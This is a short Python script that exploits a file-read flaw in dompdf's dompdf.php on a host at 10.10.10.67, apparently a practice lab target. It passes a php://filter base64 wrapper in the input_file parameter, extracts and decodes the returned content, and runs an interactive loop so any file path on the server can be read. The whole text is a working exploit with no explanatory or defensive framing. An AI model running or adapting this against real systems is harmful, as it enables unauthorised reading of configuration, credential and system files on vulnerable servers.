import requests
from base64 import b64decode
import re

def GetFile(file):
    payload = { 'input_file':'php://filter/read=convert.base64-encode/resource='+file }
    resp = (requests.get('http://10.10.10.67/dompdf/dompdf.php', params=payload).text).strip()
    b64 = re.search("\[\((.*?)\)\]", resp).group(1)
    return b64decode(b64)

while True:
    cmd = input("> ")
    try:
        output = GetFile(cmd)
        print(output.decode())
    except:
        print("ERROR")
